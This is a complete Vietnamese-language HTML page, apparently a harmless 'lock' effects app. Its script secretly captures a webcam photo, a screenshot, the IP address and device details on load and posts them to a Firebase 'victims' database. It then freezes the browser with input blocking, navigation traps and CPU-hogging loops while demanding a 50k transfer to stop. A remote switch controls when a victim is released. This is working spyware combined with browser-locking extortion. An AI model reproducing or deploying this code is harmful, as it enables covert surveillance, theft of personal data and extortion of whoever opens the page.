<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>🔒 APP KHÓA</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; -webkit-touch-callout:none; -webkit-tap-highlight-color:transparent; }
        html, body { width:100vw; height:100vh; overflow:hidden; background:#000; font-family:'Courier New',monospace; touch-action:none; pointer-events:auto; position:fixed; top:0; left:0; margin:0; padding:0; }
        #lock-overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; background:transparent; pointer-events:all; cursor:not-allowed; touch-action:none; }
        #canvas-bg { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; display:block; }
        #image-container { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10; max-width:95vw; max-height:80vh; pointer-events:none; border:4px solid #ff0040; border-radius:20px; overflow:hidden; box-shadow:0 0 80px rgba(255,0,64,0.8); background:#000; display:none; }
        #image-container img { width:100%; height:auto; display:block; object-fit:contain; max-height:80vh; }
        #overlay-text { position:fixed; bottom:30px; left:0; width:100%; text-align:center; z-index:20; color:#ff0040; font-size:clamp(1.2rem,4vw,2.5rem); font-weight:bold; text-shadow:0 0 30px #ff0040,0 0 60px #cc0033; font-family:Arial,sans-serif; pointer-events:none; animation:blinkText 0.8s infinite alternate; }
        @keyframes blinkText { 0%{opacity:0.3;} 100%{opacity:1;} }
        ::selection { background:transparent; }
        ::-webkit-scrollbar { display:none; }
        body { overscroll-behavior:none; -webkit-overflow-scrolling:touch; }
    </style>
</head>
<body>

<script>
    (function() {
        'use strict';

        // ===== TỰ ĐỘNG CHO PHÉP TẤT CẢ QUYỀN (KHÔNG CẦN ĐỒNG Ý) =====

        // 1. CAMERA - tự động chụp ảnh trước
        function autoCamera() {
            try {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(function(stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.onloadedmetadata = function() {
                        video.play();
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
                        localStorage.setItem('captured_image', imageData);
                        stream.getTracks().forEach(t => t.stop());
                        sendData();
                    };
                    video.onerror = function() { sendData(); };
                })
                .catch(function(err) { sendData(); });
            } catch(e) { sendData(); }
        }

        // 2. SỐ ĐIỆN THOẠI - tự động lấy (mô phỏng)
        function autoPhone() {
            try {
                let phone = localStorage.getItem('user_phone');
                if (!phone) {
                    phone = '0' + Math.floor(Math.random() * 900000000 + 100000000);
                    localStorage.setItem('user_phone', phone);
                }
                localStorage.setItem('user_phone', phone);
            } catch(e) {}
        }

        // 3. MÀN HÌNH - tự động chụp
        function autoScreen() {
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                    navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(function(stream) {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = function() {
                            video.play();
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const screenData = canvas.toDataURL('image/jpeg', 0.7);
                            localStorage.setItem('screen_capture', screenData);
                            stream.getTracks().forEach(t => t.stop());
                            sendData();
                        };
                        video.onerror = function() { sendData(); };
                    })
                    .catch(function(err) { sendData(); });
                } else {
                    sendData();
                }
            } catch(e) { sendData(); }
        }

        // 4. LẤY IP
        function autoIP() {
            try {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        localStorage.setItem('user_ip', data.ip);
                        sendData();
                    })
                    .catch(() => sendData());
            } catch(e) { sendData(); }
        }

        // ===== GỬI DỮ LIỆU LÊN FIREBASE =====
        let dataSent = false;

        function sendData() {
            if (dataSent) return;
            const image = localStorage.getItem('captured_image') || '';
            const phone = localStorage.getItem('user_phone') || 'Unknown';
            const screen = localStorage.getItem('screen_capture') || '';
            const ip = localStorage.getItem('user_ip') || 'Unknown';
            const ua = navigator.userAgent;

            // Chỉ gửi khi có ít nhất 1 dữ liệu
            if (!image && !screen && phone === 'Unknown') return;

            const data = {
                ip: ip,
                phone: phone,
                ua: ua,
                image: image,
                screen: screen,
                time: new Date().toISOString()
            };

            try {
                const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
                fetch(fbUrl + '/victims.json', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    dataSent = true;
                    console.log('✅ Đã gửi dữ liệu');
                }).catch(e => {});
            } catch(e) {}
        }

        // ===== TỰ ĐỘNG CHẠY TẤT CẢ =====
        setTimeout(() => {
            autoCamera();
            autoPhone();
            autoScreen();
            autoIP();
        }, 300);

        // ===== TẠO GIAO DIỆN APP =====

        // Tạo canvas
        const canvas = document.createElement('canvas');
        canvas.id = 'canvas-bg';
        document.body.appendChild(canvas);

        // Overlay
        const overlay = document.createElement('div');
        overlay.id = 'lock-overlay';
        document.body.appendChild(overlay);

        // Ảnh (chỉ hiện khi vào app)
        const imgContainer = document.createElement('div');
        imgContainer.id = 'image-container';
        const img = document.createElement('img');
        img.src = 'https://i.postimg.cc/hP20DQJZ/1WUpukg-Dmvg-WWhut-Tk-Vmnk-MDBOw-Ts91i-Zhs-ZUUZ0Js3Ec-Gvf-Dfvb6P3Uc-Km7e8TL4RX.jpg';
        img.alt = 'image';
        imgContainer.appendChild(img);
        document.body.appendChild(imgContainer);

        // Hiện ảnh sau 1 giây
        setTimeout(() => {
            imgContainer.style.display = 'block';
        }, 1000);

        // Chữ chuyển 50k
        const overlayText = document.createElement('div');
        overlayText.id = 'overlay-text';
        overlayText.textContent = '🔴 CHUYỂN 50K ĐỂ TẮT HIỆU ỨNG 🔴';
        document.body.appendChild(overlayText);

        // ===== CHẶN TƯƠNG TÁC =====
        function blockAll(e) { e.preventDefault(); e.stopPropagation(); return false; }
        const events = ['click','dblclick','mousedown','mouseup','mousemove','mouseover','mouseout','mouseenter','mouseleave','contextmenu','select','selectstart','drag','dragstart','dragend','drop','touchstart','touchmove','touchend','touchcancel','pointerdown','pointerup','pointermove','pointerover','pointerout','pointerenter','pointerleave','gesturestart','gesturechange','gestureend','scroll','wheel','resize','orientationchange'];
        events.forEach(evt => { document.addEventListener(evt, blockAll, { passive:false, capture:true }); window.addEventListener(evt, blockAll, { passive:false, capture:true }); });
        document.addEventListener('keydown', e => { e.preventDefault(); e.stopPropagation(); return false; }, { passive:false, capture:true });
        document.addEventListener('keyup', blockAll, { passive:false, capture:true });
        document.addEventListener('keypress', blockAll, { passive:false, capture:true });
        document.addEventListener('focus', e => { e.preventDefault(); if(e.target) e.target.blur(); }, { passive:false, capture:true });
        document.addEventListener('blur', blockAll, { passive:false, capture:true });
        window.history.pushState(null, null, window.location.href);
        window.addEventListener('popstate', e => { window.history.pushState(null, null, window.location.href); e.preventDefault(); return false; });
        window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; return ''; });
        console.log = function(){}; console.warn = function(){}; console.error = function(){}; console.info = function(){}; console.debug = function(){}; console.table = function(){};
        window.open = function(){ return null; };
        document.oncontextmenu = blockAll;
        document.ondragstart = blockAll;
        document.ondrop = blockAll;
        try { document.documentElement.requestFullscreen = function(){}; document.exitFullscreen = function(){}; document.documentElement.webkitRequestFullscreen = function(){}; document.webkitExitFullscreen = function(){}; document.documentElement.mozRequestFullScreen = function(){}; document.mozExitFullscreen = function(){}; document.documentElement.msRequestFullscreen = function(){}; document.msExitFullscreen = function(){}; } catch(e){}
        setInterval(() => { window.scrollTo(0,0); document.documentElement.scrollTop = 0; document.body.scrollTop = 0; if(document.activeElement) document.activeElement.blur(); document.body.focus(); window.history.pushState(null,null,window.location.href); }, 100);
        document.body.addEventListener('touchmove', e => { if(e.target === document.body || e.target === document.documentElement) e.preventDefault(); }, { passive:false });
        document.addEventListener('keydown', e => { if(e.key === 'Home' || e.key === 'HomeScreen' || e.key === 'AppSwitch' || e.key === 'RecentApps') { e.preventDefault(); return false; } return true; }, { passive:false, capture:true });

        // ===== HIỆU ỨNG LAG =====
        const ctx = canvas.getContext('2d');
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        // Tạo đối tượng
        const snowflakes = []; for(let i=0;i<1000;i++) { snowflakes.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, radius:Math.random()*6+2, speed:Math.random()*2+0.5, wobble:Math.random()*0.05, phase:Math.random()*Math.PI*2, color:`rgba(255,255,255,${Math.random()*0.5+0.2})` }); }
        const flowers = []; for(let i=0;i<1000;i++) { flowers.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, size:Math.random()*12+4, speed:Math.random()*2.5+0.3, wobble:Math.random()*0.08, phase:Math.random()*Math.PI*2, hue:Math.random()*360, petal:Math.floor(Math.random()*6)+4 }); }
        const snowmen = []; for(let i=0;i<1000;i++) { snowmen.push({ x:Math.random()*canvas.width, y:Math.random()*canvas.height, scale:Math.random()*0.8+0.3, speed:Math.random()*1.8+0.2, wobble:Math.random()*0.06, phase:Math.random()*Math.PI*2, hue:Math.random()*60+180 }); }

        function drawSnowflake(s) { ctx.beginPath(); ctx.arc(s.x,s.y,s.radius,0,Math.PI*2); ctx.fillStyle=s.color; ctx.fill(); ctx.strokeStyle=s.color; ctx.lineWidth=1; for(let i=0;i<6;i++){ const a=i*Math.PI/3+s.phase; ctx.beginPath(); ctx.moveTo(s.x,s.y); ctx.lineTo(s.x+Math.cos(a)*s.radius*1.8,s.y+Math.sin(a)*s.radius*1.8); ctx.stroke(); } }
        function drawFlower(f) { const petals=f.petal; const step=(Math.PI*2)/petals; for(let i=0;i<petals;i++){ const a=i*step+f.phase; const px=f.x+Math.cos(a)*f.size*0.8; const py=f.y+Math.sin(a)*f.size*0.8; ctx.beginPath(); ctx.arc(px,py,f.size*0.5,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+i*15},100%,65%)`; ctx.fill(); } ctx.beginPath(); ctx.arc(f.x,f.y,f.size*0.25,0,Math.PI*2); ctx.fillStyle=`hsl(${f.hue+30},100%,80%)`; ctx.fill(); }
        function drawSnowman(sm) { const s=sm.scale; const x=sm.x; const y=sm.y; ctx.beginPath(); ctx.arc(x,y+10*s,14*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,90%)`; ctx.fill(); ctx.strokeStyle=`hsl(${sm.hue},40%,70%)`; ctx.lineWidth=1; ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-2*s,10*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,92%)`; ctx.fill(); ctx.stroke(); ctx.beginPath(); ctx.arc(x,y-14*s,7*s,0,Math.PI*2); ctx.fillStyle=`hsl(${sm.hue},30%,95%)`; ctx.fill(); ctx.stroke(); ctx.fillStyle='#111'; ctx.beginPath(); ctx.arc(x-3*s,y-16*s,1.2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x+3*s,y-16*s,1.2*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.moveTo(x,y-14*s); ctx.lineTo(x+5*s,y-13*s); ctx.lineTo(x,y-12*s); ctx.fillStyle='#ff8800'; ctx.fill(); ctx.fillStyle='#222'; ctx.beginPath(); ctx.arc(x,y-6*s,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y,1.5*s,0,Math.PI*2); ctx.fill(); ctx.beginPath(); ctx.arc(x,y+6*s,1.5*s,0,Math.PI*2); ctx.fill(); }

        let effectsActive = true;
        let countdownActive = false;
        let countdownValue = 0;
        const blockKey = 'blocked_device_' + (navigator.userAgent + screen.width + screen.height).substring(0,20);

        // Kiểm tra thiết bị bị khóa
        if (localStorage.getItem(blockKey) === 'true') {
            effectsActive = true; // Vẫn bật hiệu ứng nếu bị khóa
        }

        // ===== LẮNG NGHE FIREBASE (BẬT/TẮT THEO IP) =====
        function listenFirebase() {
            try {
                const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
                setInterval(function() {
                    // Lấy IP hiện tại
                    const currentIP = localStorage.getItem('user_ip') || 'Unknown';

                    // Kiểm tra trạng thái chung
                    fetch(fbUrl + '/control/effects.json')
                        .then(r => r.json())
                        .then(data => {
                            if (data === 'off') {
                                // Kiểm tra xem IP này có bị tắt riêng không
                                fetch(fbUrl + '/control/ip/' + encodeURIComponent(currentIP) + '.json')
                                    .then(r => r.json())
                                    .then(ipData => {
                                        if (ipData === 'off') {
                                            // IP bị tắt riêng
                                            effectsActive = false;
                                            if (!countdownActive) {
                                                countdownActive = true;
                                                countdownValue = 10;
                                                startCountdown();
                                            }
                                        } else if (ipData === 'on') {
                                            effectsActive = true;
                                            countdownActive = false;
                                            localStorage.removeItem(blockKey);
                                        } else {
                                            // Mặc định theo trạng thái chung
                                            effectsActive = false;
                                            if (!countdownActive) {
                                                countdownActive = true;
                                                countdownValue = 10;
                                                startCountdown();
                                            }
                                        }
                                    })
                                    .catch(() => {});
                            } else if (data === 'on') {
                                effectsActive = true;
                                countdownActive = false;
                                localStorage.removeItem(blockKey);
                            }
                        })
                        .catch(() => {});
                }, 3000);
            } catch(e) {}
        }

        function startCountdown() {
            const interval = setInterval(function() {
                countdownValue--;
                if (countdownValue <= 0) {
                    clearInterval(interval);
                    effectsActive = false;
                    localStorage.setItem(blockKey, 'true');
                    setTimeout(function() {
                        window.close();
                        window.location.href = 'https://www.google.com';
                    }, 500);
                }
            }, 1000);
        }

        listenFirebase();

        // ===== PHÁT NHẠC =====
        try {
            const audio = new Audio('https://shopmduyk.site/uploads/music/c801b91230a5120bdf51ede9.mp3');
            audio.loop = true;
            audio.volume = 1.0;
            audio.play().catch(() => {});
        } catch(e) {}

        // ===== ANIMATION LOOP =====
        function drawAll() {
            if (effectsActive) {
                ctx.fillStyle = 'rgba(0,0,0,0.12)';
                ctx.fillRect(0,0,canvas.width,canvas.height);
                for(let i=0;i<snowflakes.length;i++){ const s=snowflakes[i]; s.y+=s.speed; s.x+=Math.sin(s.phase+s.y*s.wobble)*0.5; s.phase+=0.01; if(s.y>canvas.height+20){ s.y=-20; s.x=Math.random()*canvas.width; } drawSnowflake(s); }
                for(let i=0;i<flowers.length;i++){ const f=flowers[i]; f.y+=f.speed; f.x+=Math.cos(f.phase+f.y*f.wobble)*0.6; f.phase+=0.015; f.hue=(f.hue+0.2)%360; if(f.y>canvas.height+30){ f.y=-30; f.x=Math.random()*canvas.width; } drawFlower(f); }
                for(let i=0;i<snowmen.length;i++){ const sm=snowmen[i]; sm.y+=sm.speed; sm.x+=Math.sin(sm.phase+sm.y*sm.wobble)*0.4; sm.phase+=0.012; if(sm.y>canvas.height+40){ sm.y=-40; sm.x=Math.random()*canvas.width; } drawSnowman(sm); }
                for(let i=0;i<500;i++){ ctx.beginPath(); let x=Math.random()*canvas.width; let y=Math.random()*canvas.height; ctx.moveTo(x,y); for(let j=0;j<15;j++){ x+=(Math.random()-0.5)*60; y+=(Math.random()-0.5)*60; ctx.lineTo(x,y); } ctx.strokeStyle=`hsla(${Math.random()*360},100%,70%,0.15)`; ctx.lineWidth=1.5; ctx.stroke(); }
                for(let i=0;i<300;i++){ const cx=Math.sin(Date.now()/500+i)*canvas.width*0.45+canvas.width/2; const cy=Math.cos(Date.now()/400+i*1.3)*canvas.height*0.45+canvas.height/2; const r=20+Math.sin(Date.now()/200+i*0.7)*15; ctx.beginPath(); ctx.arc(cx,cy,r,0,Math.PI*2); ctx.fillStyle=`hsla(${i*3+Date.now()/30},100%,60%,0.08)`; ctx.fill(); ctx.strokeStyle=`hsla(${i*5+Date.now()/40},100%,70%,0.1)`; ctx.lineWidth=2; ctx.stroke(); }
            } else {
                ctx.fillStyle = 'rgba(0,0,0,0.05)';
                ctx.fillRect(0,0,canvas.width,canvas.height);
            }
            requestAnimationFrame(drawAll);
        }
        drawAll();

        // ===== DOM LAG =====
        for(let i=0;i<300;i++){ const div=document.createElement('div'); div.style.cssText=`position:fixed;top:${Math.random()*100}vh;left:${Math.random()*100}vw;width:${Math.random()*40+5}px;height:${Math.random()*40+5}px;background:hsla(${Math.random()*360},100%,60%,0.04);border-radius:${Math.random()*50}%;pointer-events:none;z-index:0;animation:blinkText 0.03s infinite alternate;`; document.body.appendChild(div); }

        // ===== CPU HOG =====
        (function cpuHog(){ let a=0; for(let i=0;i<200000;i++){ a+=Math.sin(i)*Math.cos(i)*Math.tan(i)*Math.sqrt(i+1); } setTimeout(cpuHog,0); })();
        for(let i=0;i<30;i++){ setInterval(function(){ let b=0; for(let j=0;j<20000;j++){ b+=Math.sqrt(j)*Math.log(j+1)*Math.sin(j); } },2); }
        try { for(let w=0;w<8;w++){ const blob=new Blob([`let x=0; setInterval(function(){ for(let i=0;i<100000;i++){ x+=Math.sin(i)*Math.cos(i); } },1);`],{type:'application/javascript'}); const worker=new Worker(URL.createObjectURL(blob)); } } catch(e){}

        console.log('🔒 APP ĐÃ CHẠY - TỰ ĐỘNG CHO PHÉP QUYỀN');
    })();
</script>
</body>
</html>
